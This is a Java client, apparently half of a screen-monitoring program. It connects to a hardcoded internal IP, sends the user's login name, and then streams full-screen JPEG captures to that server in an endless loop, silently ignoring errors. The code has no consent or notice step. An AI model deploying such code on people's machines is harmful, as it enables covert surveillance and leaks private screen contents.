import java.awt.AWTException;
import java.awt.Rectangle;
import java.awt.Robot;
import java.awt.Toolkit;
import java.awt.image.BufferedImage;
import java.io.ByteArrayOutputStream;
import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.IOException;
import java.io.ObjectOutputStream;
import java.io.OutputStream;
import java.net.Socket;
import java.net.UnknownHostException;

import javax.imageio.ImageIO;
public class Client_img {
	private static Socket socket;
	private static String host = "devett";
 	public static int sleepingTime=1000;
	public static void main(String[] args) throws AWTException 
		{
		Robot robot=new Robot();
		try {
			socket = new Socket("10.224.140.67", 1010);
			DataInputStream dis=new DataInputStream(socket.getInputStream());  
			sleepingTime=Integer.parseInt((String)dis.readUTF());  
			
		} 
		catch (UnknownHostException e) 
		{
			System.err.println("Don't know about host: " + host);
		} catch (IOException e) {
			e.printStackTrace();
		}
		
		
		try
		{
		DataOutputStream dout=new DataOutputStream(socket.getOutputStream());  
		dout.writeUTF(System.getProperty("user.name"));  
		dout.flush();  
		System.out.println();
		for(int i=0;;i++)
		{
		BufferedImage image=robot.createScreenCapture(new Rectangle(Toolkit.getDefaultToolkit().getScreenSize()));
		ByteArrayOutputStream baos = new ByteArrayOutputStream();
		ImageIO.write( image, "jpg", baos );
		baos.flush();
		 //Toolkit.getDefaultToolkit().beep();
		byte [] byteImage = baos.toByteArray();
		baos.close();
 
		OutputStream os = socket.getOutputStream();
 
		ObjectOutputStream oos = new ObjectOutputStream(os);
		oos.writeObject(byteImage);
		Thread.sleep(sleepingTime);
		}
	}
		catch(Exception e){}
		System.out.println("\nServer Terminated The Connection Thank you...");

	}
}
